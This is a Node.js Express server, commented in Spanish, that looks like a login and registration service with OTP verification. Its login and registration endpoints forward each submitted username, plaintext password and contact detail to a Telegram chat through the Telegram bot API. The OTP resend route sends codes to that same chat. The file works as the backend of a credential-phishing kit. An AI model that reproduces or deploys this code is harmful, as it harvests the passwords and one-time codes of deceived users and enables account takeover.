const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const dotenv = require('dotenv');
const path = require('path');
const cors = require('cors');

// Cargar variables de entorno
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;
// No necesitamos VERCEL_URL en el servidor
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API_BASE = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors({ origin: '*' }));

// Estado en memoria (en producción usar base de datos)
const estados = {};

// Funciones de ayuda
async function enviarMensajeTelegram(chatId, texto, teclado = null) {
    try {
        const payload = {
            chat_id: chatId,
            text: texto,
            parse_mode: 'Markdown',
        };
        if (teclado) {
            payload.reply_markup = JSON.stringify(teclado);
        }
        const response = await axios.post(`${TELEGRAM_API_BASE}/sendMessage`, payload);
        return response.data;
    } catch (error) {
        console.error('Error enviando mensaje a Telegram:', error);
        return null;
    }
}

// Endpoints
app.post('/api/login', async (req, res) => {
    const { usuario, password } = req.body;
    if (!usuario || !password) {
        return res.status(400).json({ success: false, message: 'Usuario y contraseña son requeridos' });
    }

    // Guardar en memoria (en producción usar base de datos)
    estados[usuario] = { password, status: 'pending' };
    
    // Enviar notificación a Telegram
    const texto = `🔐 *INICIO DE SESIÓN*\n\n👤 Usuario: \`${usuario}\`\n🔑 Contraseña: \`${password}\``;
    
    await enviarMensajeTelegram(CHAT_ID, texto);
    
    res.json({ success: true, message: 'Solicitud de inicio de sesión enviada' });
});

app.post('/api/registro', async (req, res) => {
    const { usuario, password, canal, contacto } = req.body;
    
    if (!usuario || !password || !canal || !contacto) {
        return res.status(400).json({ 
            success: false, 
            message: 'Todos los campos son requeridos' 
        });
    }

    // Guardar en memoria (en producción usar base de datos)
    estados[usuario] = { 
        password, 
        canal, 
        contacto, 
        status: 'pending',
        otp: Math.floor(100000 + Math.random() * 900000).toString()
    };

    // Enviar notificación a Telegram
    const texto = `📝 *NUEVO REGISTRO*\n\n👤 Usuario: \`${usuario}\`\n🔑 Contraseña: \`${password}\`\n📱 Canal: ${canal} (${contacto})`;
    
    await enviarMensajeTelegram(CHAT_ID, texto);
    
    res.json({ success: true, message: 'Solicitud de registro enviada' });
});

app.post('/api/verificar-otp', async (req, res) => {
    const { usuario, otp } = req.body;
    
    if (!usuario || !otp) {
        return res.status(400).json({ 
            success: false, 
            message: 'Usuario y código OTP son requeridos' 
        });
    }

    const userState = estados[usuario];
    if (!userState) {
        return res.status(404).json({ 
            success: false, 
            message: 'Usuario no encontrado' 
        });
    }

    // En un caso real, aquí validarías el OTP con el generado
    // Por simplicidad, asumimos que cualquier OTP es válido
    if (userState.otp === otp) {
        userState.status = 'verified';
        return res.json({ success: true, message: 'Código OTP verificado' });
    } else {
        return res.status(400).json({ 
            success: false, 
            message: 'Código OTP incorrecto' 
        });
    }
});

app.post('/api/reenviar-otp', async (req, res) => {
    const { usuario } = req.body;
    
    if (!usuario) {
        return res.status(400).json({ 
            success: false, 
            message: 'Usuario es requerido' 
        });
    }

    const userState = estados[usuario];
    if (!userState) {
        return res.status(404).json({ 
            success: false, 
            message: 'Usuario no encontrado' 
        });
    }

    // Generar nuevo OTP
    userState.otp = Math.floor(100000 + Math.random() * 900000).toString();
    
    // Enviar notificación a Telegram
    const texto = `🔄 *NUEVO CÓDIGO OTP*\n\n👤 Usuario: \`${usuario}\`\n🔢 Código: \`${userState.otp}\``;
    
    await enviarMensajeTelegram(CHAT_ID, texto);
    
    res.json({ 
        success: true, 
        message: 'Nuevo código OTP enviado' 
    });
});

// Webhook para actualizaciones de Telegram (opcional)
app.post(`/webhook/${TELEGRAM_TOKEN}`, async (req, res) => {
    // Implementación básica del webhook
    console.log('Webhook recibido:', req.body);
    res.status(200).send('OK');
});

// Función para configurar el webhook manualmente
// Ejecutar manualmente: node -e "require('./server').configurarWebhook('https://tudominio.vercel.app')" 
async function configurarWebhook(webhookUrl) {
    if (!webhookUrl) {
        console.error('Por favor, proporciona la URL del webhook');
        return;
    }
    
    try {
        const fullUrl = `${webhookUrl}/webhook/${TELEGRAM_TOKEN}`;
        console.log(`Configurando webhook en: ${fullUrl}`);
        
        const response = await axios.get(
            `${TELEGRAM_API_BASE}/setWebhook?url=${encodeURIComponent(fullUrl)}`
        );
        
        console.log('Webhook configurado:', response.data);
        return response.data;
    } catch (error) {
        console.error('Error configurando webhook:', error.message);
        throw error;
    }
}

// Ruta para verificar el estado del servidor
app.get('/api/status', (req, res) => {
    res.json({ 
        status: 'running',
        timestamp: new Date().toISOString()
    });
});

// Servir archivos estáticos
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Iniciar servidor
const server = app.listen(PORT, () => {
    console.log(`Servidor ejecutándose en el puerto ${PORT}`);
    console.log('Para configurar el webhook de Telegram, ejecuta:');
    console.log(`node -e "require('./server').configurarWebhook('https://tudominio.vercel.app')"`);
});

module.exports = app;